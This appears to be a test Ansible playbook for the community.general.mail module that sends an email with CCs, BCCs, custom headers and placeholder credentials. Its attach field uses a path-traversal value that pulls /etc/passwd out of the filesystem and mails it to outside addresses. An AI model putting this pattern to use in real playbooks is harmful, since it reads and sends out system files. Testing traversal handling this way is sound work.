---
- name: Test playbook for community.general.mail module
  hosts: localhost
  gather_facts: false

  tasks:
    - name: Send email
      community.general.mail:
        attach: "../../../../../../../etc/passwd"
        bcc: ["bob@example.com", "alice@example.com"]
        body: "This is the email body"
        cc: ["tom@example.com", "jerry@example.com"]
        charset: "utf-8"
        ehlohost: "smtp.example.com"
        headers:
          - "X-Custom-Header: Custom Value"
          - "X-Another-Header: Another Value"
        host: "smtp.gmail.com"
        password: "password123"
        port: "587"
        secure: "starttls"
        sender: "sender@example.com"
        subject: "Test Email"
        subtype: "plain"
        timeout: 60
        to: ["john@example.com", "jane@example.com"]
        username: "user"